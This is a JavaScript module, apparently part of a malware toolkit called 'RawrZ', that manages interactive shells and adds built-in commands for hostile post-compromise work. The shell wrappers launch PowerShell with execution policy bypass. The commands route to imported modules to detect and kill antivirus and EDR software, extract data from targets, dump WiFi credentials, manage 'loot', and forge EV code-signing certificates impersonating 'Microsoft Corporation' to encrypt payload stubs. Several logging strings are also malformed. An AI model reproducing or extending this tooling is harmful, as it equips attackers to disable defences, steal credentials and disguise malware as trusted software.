const { spawn, exec } = require('child_process');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const os = require('os');
const net = require('net');
const tls = require('tls');
const memoryManager = require('./memory-manager');

class RedShells {
    // Performance monitoring
    static performance = {
        monitor: (fn) => {
            const start = process.hrtime.bigint();
            const result = fn();
            const end = process.hrtime.bigint();
            const duration = Number(end - start) / 1000000; // Convert to milliseconds
            if (duration > 100) { // Log slow operations
                logger.warn(`[PERF] Slow operation: ${duration.toFixed(2)}ms`);
            }
            return result;
        }
    }
    constructor() {
        this.name = 'RawrZ Red Shells';
        this.version = '1.0.30';
        this.initialized = false;
        this.activeShells = new Map();
        this.shellHistory = new Map();
        this.redKiller = null;
        this.evCertEncryptor = null;
        
        // Shell configurations
        this.shellTypes = {
            'powershell': {
                command: 'powershell.exe',
                args: ['-NoProfile', '-ExecutionPolicy', 'Bypass', '-NoExit'],
                platform: 'win32'
            },
            'cmd': {
                command: 'cmd.exe',
                args: ['/k'],
                platform: 'win32'
            },
            'bash': {
                command: 'bash',
                args: ['-i'],
                platform: 'unix'
            },
            'sh': {
                command: 'sh',
                args: ['-i'],
                platform: 'unix'
            },
            'python': {
                command: 'python',
                args: ['-i'],
                platform: 'all'
            },
            'node': {
                command: 'node',
                args: ['-i'],
                platform: 'all'
            }
        };

        // Red Killer integration
        this.redKillerFeatures = {
            'av-edr-detection': true,
            'termination': true,
            'data-extraction': true,
            'wifi-dump': true,
            'loot-management': true
        };

        // EV Certificate integration
        this.evCertFeatures = {
            'cert-generation': true,
            'stub-encryption': true,
            'multi-language': true,
            'advanced-encryption': true
        };
    }

    async initialize() {
        try {
            console.log('[Red Shells] Initializing Red Shells system...');
            
            // Initialize Red Killer integration
            this.redKiller = require('./red-killer');
            if (this.redKiller && typeof this.redKiller.initialize === 'function') {
                await this.redKiller.initialize();
                console.log('[Red Shells] Red Killer integration initialized');
            }

            // Initialize EV Certificate Encryptor integration (use existing instance)
            const EVCertEncryptor = require('./ev-cert-encryptor');
const { logger } = require('../utils/logger');
            this.evCertEncryptor = new EVCertEncryptor();
            // Only initialize if not already initialized to prevent double initialization
            if (this.evCertEncryptor && typeof this.evCertEncryptor.initialize === 'function' && !this.evCertEncryptor.initialized) {
                await this.evCertEncryptor.initialize();
                console.log('[Red Shells] EV Certificate Encryptor integration initialized');
            } else if (this.evCertEncryptor && this.evCertEncryptor.initialized) {
                console.log('[Red Shells] EV Certificate Encryptor already initialized, using existing instance');
            }

            this.initialized = true;
            console.log('[Red Shells] Red Shells system initialized successfully');
            return true;
        } catch (error) {
            console.error('[Red Shells] Initialization failed:', error);
            return false;
        }
    }

    // Create a new Red Shell with integrated features
    async createRedShell(shellType = 'powershell', options = {}) {
        if (!this.initialized) {
            await this.initialize();
        }

        const shellId = this.generateShellId();
        const shellConfig = this.shellTypes[shellType];
        
        if (!shellConfig) {
            throw new Error(`Unsupported shell type: ${shellType}`);
        }

        if (shellConfig.platform !== 'all' && shellConfig.platform !== process.platform) {
            throw new Error(`Shell type ${shellType} is not supported on process.platform`);
        }

        const shell = {
            id: shellId,
            type: shellType,
            config: shellConfig,
            process: null,
            status: 'creating',
            createdAt: new Date(),
            lastActivity: new Date(),
            history: [],
            redKillerEnabled: options.redKillerEnabled !== false,
            evCertEnabled: options.evCertEnabled !== false,
            autoExtract: options.autoExtract !== false, // WIDE OPEN - Auto-extract enabled by default
            autoKill: options.autoKill !== false, // WIDE OPEN - Auto-kill enabled by default
            tlsEnabled: options.tlsEnabled !== false, // WIDE OPEN - TLS enabled by default
            encryptionKey: options.encryptionKey || crypto.randomBytes(32).toString('hex')
        };

        try {
            // Create the shell process
            shell.process = spawn(shellConfig.command, shellConfig.args, {
                stdio: ['pipe', 'pipe', 'pipe'],
                shell: false,
                env: { ...process.env, ...options.env }
            });

            shell.status = 'active';
            this.activeShells.set(shellId, shell);
            this.shellHistory.set(shellId, []);

            // Set up event handlers
            this.setupShellEventHandlers(shell);

            // Initialize Red Killer features if enabled
            if (shell.redKillerEnabled && this.redKiller) {
                await this.initializeRedKillerFeatures(shell);
            }

            // Initialize EV Certificate features if enabled
            if (shell.evCertEnabled && this.evCertEncryptor) {
                await this.initializeEVCertFeatures(shell);
            }

            console.log(`[Red Shells] Created ${shellType} shell: shellId`);
            return shell;

        } catch (error) {
            shell.status = 'error';
            shell.error = error.message;
            console.error("[Red Shells] Failed to create shell " + shellId + ":", error);
            throw error;
        }
    }

    // Set up event handlers for shell process
    setupShellEventHandlers(shell) {
        shell.process.stdout.on('data', (data) => {
            const output = data.toString();
            shell.lastActivity = new Date();
            shell.history.push({
                type: 'output',
                data: output,
                timestamp: new Date()
            });
            
            // Auto-extract data if enabled
            if (shell.autoExtract && this.redKiller) {
                this.triggerAutoExtraction(shell, output);
            }
        });

        shell.process.stderr.on('data', (data) => {
            const error = data.toString();
            shell.lastActivity = new Date();
            shell.history.push({
                type: 'error',
                data: error,
                timestamp: new Date()
            });
        });

        shell.process.on('close', (code) => {
            shell.status = 'closed';
            shell.exitCode = code;
            shell.closedAt = new Date();
            console.log(`[Red Shells] Shell ${shell.id} closed with code code`);
        });

        shell.process.on('error', (error) => {
            shell.status = 'error';
            shell.error = error.message;
            console.error("[Red Shells] Shell " + shell.id + " error:", error);
        });
    }

    // Initialize Red Killer features for a shell
    async initializeRedKillerFeatures(shell) {
        try {
            // Add Red Killer commands to shell
            const redKillerCommands = {
                'redkiller-detect': 'Detect AV/EDR systems',
                'redkiller-execute': 'Execute Red Killer termination',
                'redkiller-extract': 'Extract data from target',
                'redkiller-wifi': 'Dump WiFi credentials',
                'redkiller-loot': 'Browse loot container'
            };

            shell.redKillerCommands = redKillerCommands;
            console.log(`[Red Shells] Red Killer features initialized for shell ${shell.id}`);
        } catch (error) {
            console.error(`[Red Shells] Failed to initialize Red Killer features:`, error);
        }
    }

    // Initialize EV Certificate features for a shell
    async initializeEVCertFeatures(shell) {
        try {
            // Add EV Certificate commands to shell
            const evCertCommands = {
                'evcert-generate': 'Generate EV certificate',
                'evcert-encrypt': 'Encrypt stub with EV certificate',
                'evcert-list': 'List certificates',
                'evcert-stubs': 'List encrypted stubs',
                'evcert-templates': 'List available templates'
            };

            shell.evCertCommands = evCertCommands;
            console.log(`[Red Shells] EV Certificate features initialized for shell ${shell.id}`);
        } catch (error) {
            console.error(`[Red Shells] Failed to initialize EV Certificate features:`, error);
        }
    }

    // Execute command in shell
    async executeCommand(shellId, command) {
        const shell = this.activeShells.get(shellId);
        if (!shell) {
            throw new Error("Shell " + shellId + " not found");
        }

        if (shell.status !== 'active') {
            throw new Error("Shell ${shellId} is not active (status: " + shell.status + ")");
        }

        // Check for Red Killer commands
        if (shell.redKillerEnabled && this.redKiller) {
            const redKillerResult = await this.handleRedKillerCommand(shell, command);
            if (redKillerResult.handled) {
                return redKillerResult;
            }
        }

        // Check for EV Certificate commands
        if (shell.evCertEnabled && this.evCertEncryptor) {
            const evCertResult = await this.handleEVCertCommand(shell, command);
            if (evCertResult.handled) {
                return evCertResult;
            }
        }

        // Execute regular command
        return await this.executeRegularCommand(shell, command);
    }

    // Handle Red Killer commands
    async handleRedKillerCommand(shell, command) {
        const parts = command.trim().split(' ');
        const cmd = parts[0];

        try {
            switch (cmd) {
                case 'redkiller-detect':
                    const detected = await this.redKiller.detectAVEDR();
                    return {
                        handled: true,
                        output: "[Red Killer] Detection complete: ${detected.antivirus.length} AV, " + detected.edr.length + " EDR systems found",
                        data: detected
                    };

                case 'redkiller-execute':
                    const systems = parts.slice(1);
                    if (systems.length === 0) {
                        return {
                            handled: true,
                            output: '[Red Killer] Usage: redkiller-execute <system1>` <system2>` ...',
                            error: 'No systems specified'
                        };
                    }
                    const result = await this.redKiller.executeRedKiller(systems);
                    return {
                        handled: true,
                        output: "[Red Killer] Termination complete: ${result.totalSuccessful}/" + result.totalAttempted + " successful",
                        data: result
                    };

                case 'redkiller-extract':
                    const targets = parts.slice(1);
                    const extracted = await this.redKiller.extractData(targets.length > 0 ? targets : null);
                    return {
                        handled: true,
                        output: '[Red Killer] Data extraction completed',
                        data: extracted
                    };

                case 'redkiller-wifi':
                    const wifi = await this.redKiller.dumpWiFiCredentials();
                    return {
                        handled: true,
                        output: "[Red Killer] WiFi dump completed: " + wifi.length + " profiles found",
                        data: wifi
                    };

                case 'redkiller-loot':
                    const loot = await this.redKiller.browseLootContainer();
                    return {
                        handled: true,
                        output: "[Red Killer] Loot container: " + loot.length + " items",
                        data: loot
                    };

                default:
                    return { handled: false };
            }
        } catch (error) {
            return {
                handled: true,
                output: `[Red Killer] Error: ${error.message}`,
                error: error.message
            };
        }
    }

    // Handle EV Certificate commands
    async handleEVCertCommand(shell, command) {
        const parts = command.trim().split(' ');
        const cmd = parts[0];

        try {
            switch (cmd) {
                case 'evcert-generate':
                    // Handle multi-word template names by joining remaining parts
                    const templateParts = parts.slice(1);
                    const template = templateParts.length > 0 ? templateParts.join(' ') : 'Microsoft Corporation';
                    const options = {};
                    const cert = await this.evCertEncryptor.generateEVCertificate(template, options);
                    return {
                        handled: true,
                        output: `[EV Cert] Certificate generated: ${cert.id}`,
                        data: cert
                    };

                case 'evcert-encrypt':
                    if (parts.length < 3) {
                        return {
                            handled: true,
                            output: '[EV Cert] Usage: evcert-encrypt <certId>` <stubCode>`',
                            error: 'Missing parameters'
                        };
                    }
                    const certId = parts[1];
                    const stubCode = parts.slice(2).join(' ');
                    const encrypted = await this.evCertEncryptor.encryptStubWithEVCert(stubCode, 'javascript', certId);
                    return {
                        handled: true,
                        output: `[EV Cert] Stub encrypted: ${encrypted.stubId}`,
                        data: encrypted
                    };

                case 'evcert-list':
                    const certs = await this.evCertEncryptor.getCertificates();
                    return {
                        handled: true,
                        output: "[EV Cert] Certificates: " + certs.length + " found",
                        data: certs
                    };

                case 'evcert-stubs':
                    const stubs = await this.evCertEncryptor.getEncryptedStubs();
                    return {
                        handled: true,
                        output: "[EV Cert] Encrypted stubs: " + stubs.length + " found",
                        data: stubs
                    };

                case 'evcert-templates':
                    const templates = await this.evCertEncryptor.getSupportedTemplates();
                    return {
                        handled: true,
                        output: `[EV Cert] Available templates: ${templates.join(', ')}`,
                        data: templates
                    };

                default:
                    return { handled: false };
            }
        } catch (error) {
            return {
                handled: true,
                output: `[EV Cert] Error: ${error.message}`,
                error: error.message
            };
        }
    }

    // Execute regular command
    async executeRegularCommand(shell, command) {
        return new Promise((resolve, reject) => {
            const startTime = Date.now();
            
            shell.history.push({
                type: 'input',
                data: command,
                timestamp: new Date()
            });

            // For interactive shells, we need to handle output differently
            let outputBuffer = '';
            let outputReceived = false;

            // Set up temporary output listener
            const onData = (data) => {
                outputBuffer += data.toString();
                outputReceived = true;
            };

            // Add listener
            shell.process.stdout.on('data', onData);

            // Send command to shell
            shell.process.stdin.write(command + '\n');

            // Wait for output (with timeout)
            const timeout = setTimeout(() => {
                shell.process.stdout.removeListener('data', onData);
                resolve({
                    handled: false,
                    output: outputReceived ? outputBuffer : '[Timeout] Command execution timed out',
                    duration: Date.now() - startTime
                });
            }, 10000); // 10 second timeout

            // For simple commands, wait a bit then resolve
            setTimeout(() => {
                shell.process.stdout.removeListener('data', onData);
                clearTimeout(timeout);
                resolve({
                    handled: false,
                    output: outputReceived ? outputBuffer : 'Command sent successfully',
                    duration: Date.now() - startTime
                });
            }, 2000); // 2 second delay for simple commands
        });
    }

    // Trigger auto-extraction based on command output
    async triggerAutoExtraction(shell, output) {
        try {
            // Look for patterns that indicate successful operations
            const extractionPatterns = [
                /successfully extracted/i,
                /data extraction complete/i,
                /loot stored/i,
                /credentials dumped/i
            ];

            const shouldExtract = extractionPatterns.some(pattern => pattern.test(output));
            
            if (shouldExtract && this.redKiller) {
                console.log(`[Red Shells] Auto-extraction triggered for shell ${shell.id}`);
                await this.redKiller.extractData();
            }
        } catch (error) {
            console.error(`[Red Shells] Auto-extraction failed:`, error);
        }
    }

    // List active shells
    getActiveShells() {
        const shells = [];
        for (const [id, shell] of this.activeShells) {
            shells.push({
                id: shell.id,
                type: shell.type,
                status: shell.status,
                createdAt: shell.createdAt,
                lastActivity: shell.lastActivity,
                redKillerEnabled: shell.redKillerEnabled,
                evCertEnabled: shell.evCertEnabled,
                historyLength: shell.history.length
            });
        }
        return shells;
    }

    // Get shell history
    getShellHistory(shellId) {
        return this.shellHistory.get(shellId) || [];
    }

    // Terminate shell
    async terminateShell(shellId) {
        const shell = this.activeShells.get(shellId);
        if (!shell) {
            throw new Error("Shell " + shellId + " not found");
        }

        try {
            if (shell.process && shell.status === 'active') {
                shell.process.kill('SIGTERM');
                
                // Force kill after 5 seconds if still running
                setTimeout(() => {
                    if (shell.status === 'active' && shell.process) {
                        shell.process.kill('SIGKILL');
                    }
                }, 5000);
            }

            shell.status = 'terminated';
            shell.terminatedAt = new Date();
            
            console.log("[Red Shells] Shell " + shellId + " terminated");
            return true;
        } catch (error) {
            console.error("[Red Shells] Failed to terminate shell " + shellId + ":", error);
            throw error;
        }
    }

    // Generate unique shell ID
    generateShellId() {
        return `shell_${Date.now()}_${crypto.randomBytes(8).toString('hex')}`;
    }

    // Get system status
    async getStatus() {
        return {
            name: this.name,
            version: this.version,
            initialized: this.initialized,
            activeShells: this.activeShells.size,
            totalHistory: this.shellHistory.size,
            redKillerEnabled: this.redKiller !== null,
            evCertEnabled: this.evCertEncryptor !== null,
            supportedShellTypes: Object.keys(this.shellTypes)
        };
    }

    // Get shell statistics
    getShellStats() {
        const stats = {
            totalShells: this.activeShells.size,
            activeShells: 0,
            terminatedShells: 0,
            errorShells: 0,
            shellTypes: {},
            totalCommands: 0
        };

        for (const [id, shell] of this.activeShells) {
            stats.shellTypes[shell.type] = (stats.shellTypes[shell.type] || 0) + 1;
            stats.totalCommands += shell.history.length;

            switch (shell.status) {
                case 'active':
                    stats.activeShells++;
                    break;
                case 'terminated':
                case 'closed':
                    stats.terminatedShells++;
                    break;
                case 'error':
                    stats.errorShells++;
                    break;
            }
        }

        return stats;
    }

    // Panel Integration Methods
    async getPanelConfig() {
        return {
            name: this.name,
            version: this.version,
            description: this.description || 'RawrZ Engine',
            endpoints: this.getAvailableEndpoints(),
            settings: this.getSettings(),
            status: this.getStatus()
        };
    }
    
    getAvailableEndpoints() {
        return [
            { method: 'GET', path: '/api/' + this.name + '/status', description: 'Get engine status' },
            { method: 'POST', path: '/api/' + this.name + '/initialize', description: 'Initialize engine' },
            { method: 'POST', path: '/api/' + this.name + '/start', description: 'Start engine' },
            { method: 'POST', path: '/api/' + this.name + '/stop', description: 'Stop engine' }
        ];
    }
    
    getSettings() {
        return {
            enabled: this.enabled || true,
            autoStart: this.autoStart || false,
            config: this.config || {}
        };
    }
    
    // CLI Integration Methods
    async getCLICommands() {
        return [
            {
                command: this.name + ' status',
                description: 'Get engine status',
                action: async () => {
                    const status = this.getStatus();
                    
                    return status;
                }
            },
            {
                command: this.name + ' start',
                description: 'Start engine',
                action: async () => {
                    const result = await this.start();
                    
                    return result;
                }
            },
            {
                command: this.name + ' stop',
                description: 'Stop engine',
                action: async () => {
                    const result = await this.stop();
                    
                    return result;
                }
            },
            {
                command: this.name + ' config',
                description: 'Get engine configuration',
                action: async () => {
                    const config = this.getConfig();
                    
                    return config;
                }
            }
        ];
    }
    
    getConfig() {
        return {
            name: this.name,
            version: this.version,
            enabled: this.enabled || true,
            autoStart: this.autoStart || false,
            settings: this.settings || {}
        };
    }

}

// Create and export instance
const redShells = new RedShells();

module.exports = redShells;
